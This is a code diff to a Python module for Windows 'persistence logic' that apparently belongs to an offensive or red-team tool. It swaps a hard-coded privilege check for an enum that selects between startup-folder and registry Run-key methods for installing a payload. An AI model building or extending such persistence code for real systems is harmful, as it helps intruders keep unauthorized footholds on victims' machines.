@@ -5,6 +5,7 @@ windows.py: Windows-specific persistence logic.
 from .base import Persistence
 from .windows_utilities.startup import StartupFolder
 from .windows_utilities.persistence_methods import WindowsPersistenceMethods
+from .windows_utilities.permissions import WindowsPrivilege
 
 
 class WindowsPersistence(Persistence):
@@ -31,7 +32,7 @@ class WindowsPersistence(Persistence):
         """
         Determine the recommended persistence method for Windows.
         """
-        if self.identifier == 0:
+        if self.identifier == WindowsPrivilege.STANDARD_USER.value:
             return WindowsPersistenceMethods.STARTUP_CURRENT_USER.value
 
         return WindowsPersistenceMethods.STARTUP_GLOBAL.value
@@ -43,7 +44,7 @@ class WindowsPersistence(Persistence):
         """
         methods = [method.value for method in WindowsPersistenceMethods]
 
-        if self.identifier == 0:
+        if self.identifier == WindowsPrivilege.STANDARD_USER.value:
             methods.remove(WindowsPersistenceMethods.REGEDIT_RUN.value)
             methods.remove(WindowsPersistenceMethods.STARTUP_GLOBAL.value)
 
@@ -56,7 +57,7 @@ class WindowsPersistence(Persistence):
         """
         method = self.configured_persistence_method()
 
-        
+
 
         if method == WindowsPersistenceMethods.STARTUP_CURRENT_USER.value:
             StartupFolder(payload=self.payload).install_current_user()
